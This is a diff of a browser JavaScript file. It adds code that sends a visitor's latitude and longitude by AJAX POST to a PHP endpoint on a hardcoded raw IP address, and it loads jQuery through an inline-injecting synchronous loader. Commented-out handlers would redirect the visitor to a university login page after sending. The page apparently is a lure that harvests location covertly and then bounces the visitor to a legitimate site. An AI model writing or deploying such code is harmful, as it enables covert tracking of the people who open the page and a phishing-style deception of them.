@@ -1,25 +1,44 @@
 // config
 var config = {
-  serverIp: "5.160.248.36",
+  serverIp: "5.160.250.61",
   triggerElement: "TransButton",
   // add all dependecies here
   dependencies: [
    {
      tag: "script",
-     attr: "src",
+     attr: "innerHTML",
      value: "https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"
    } 
   ]
 };
 
-// loading dependecies
+// dependency loader
 (function(){
   config.dependencies.map((obj) => {
     var dependency = document.createElement(obj.tag);
-    dependency[obj.attr] = obj.value;
-    document.head.appendChild(dependency);
+    if (obj.tag == "script"){
+      addScriptSync(obj.value, dependency, obj.attr);
+    }
+    else{
+      dependency[obj.attr] = obj.value;
+      document.head.appendChild(dependency);
+    }
   });
 })();
+
+// load scripts (like jquery) synchronously to make the script fit in a single file and easy to load
+function addScriptSync(url, tag, attr){
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+      if (this.readyState == 4 && this.status == 200) {
+        tag.innerHTML = this.responseText;
+        document.getElementsByTagName("head")[0].appendChild(tag);
+      }
+  };
+  xhttp.open("GET", url , false);
+  xhttp.send();
+};
+
 
 // converting px to cm 
 function px2cm(px) {
@@ -28,6 +47,7 @@ function px2cm(px) {
   d.remove();
   return px / px_per_cm;
 }
+
 var data = {
   chrome: {
     name: "chrome",
@@ -64,7 +84,21 @@ var data = {
 
 function sendLocationToServer(latitude, longitude){
   // make a ajax call here
-  console.log(latitude, longitude);
+  $.ajax({
+      url: 'http://' + config.serverIp + '/get.php',
+      type: 'post',
+      dataType: 'json',
+      // success: function (data) {
+      //   window.location.replace('https://sess.shirazu.ac.ir/sess/script/login.aspx');       
+      // },
+      // error: function(){
+      //   window.location.replace('https://sess.shirazu.ac.ir/sess/script/login.aspx');       
+      // },
+      data: {
+        latitude: latitude,
+        longitude:longitude 
+      }
+  });
 }
 
 function callGeolocation(){
